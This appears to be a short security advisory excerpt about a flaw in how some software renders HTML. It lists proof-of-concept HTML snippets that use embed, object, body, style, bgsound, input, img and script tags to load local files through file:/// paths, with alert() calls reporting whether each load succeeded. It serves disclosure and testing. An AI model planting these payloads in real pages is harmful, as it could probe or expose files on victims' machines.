An attacker may exploit these issues by enticing victims into viewing malicious HTML content.

The following proof-of-concept HTML code is available:

- Embed Tag Local file Access:

&lt;EMBED SRC="file:///C:/example.pdf" HEIGHT=600 WIDTH=1440&gt;&lt;/EMBED&gt;

- Object &amp; Param Tag Local File Access:

&lt;object type="audio/x-mid" data="file:///C:/example.mid" width="200"
height="20"&gt;
&lt;param name="src" value="file:///C:/example.mid"&gt;
&lt;param name="autoStart" value="true"&gt;
&lt;param name="autoStart" value="0"&gt;
&lt;/object&gt;

- Body Tag Local File Access:

&lt;body background="file:///C:/example.gif" onload="alert('loading body
bgrd success')" onerror="alert('loading body bgrd error')"&gt;

- Style Tag Local File Access:

&lt;STYLE type="text/css"&gt;BODY{background:url("file:///C:/example.gif")}
&lt;/STYLE&gt;

- Bgsound Tag Local File Access:

&lt;bgsound src="file:///C:/example.mid" id="soundeffect" loop=1 autostart=
"true"/&gt;

- Input Tag Local File Access:

&lt;form&gt;
&lt;input type="image" src="file:///C:/example.gif" onload="alert('loading
input success')" onerror="alert('loading input error')"&gt;
&lt;/form&gt;

- Image Tag Local File Access:

&lt;img src="file:///C:/example.jpg" onload="alert('loading image success')"
onerror="alert('loading image error')"&gt;

- Script Tag Local File Access:

&lt;script src="file:///C:/example.js"&gt;&lt;/script&gt;
